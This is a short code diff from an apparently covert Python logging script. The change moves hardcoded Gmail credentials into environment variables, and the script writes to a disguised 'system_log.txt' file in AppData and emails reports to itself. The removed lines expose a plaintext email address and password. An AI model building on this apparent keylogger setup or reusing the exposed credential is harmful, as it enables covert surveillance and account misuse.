@@ -3,9 +3,11 @@ import smtplib
 import threading
 import time
 import os
+from dotenv import load_dotenv
 
-EMAIL = "johndoveisgoat@gmail.com"
-PASSWORD = "snygbstrarxwmxwt"
+load_dotenv()
+EMAIL = os.getenv("email")
+PASSWORD = os.getenv("passwd")
 TO_EMAIL = EMAIL
 
 LOG_FILE = os.path.expanduser("~\\AppData\\Roaming\\system_log.txt")
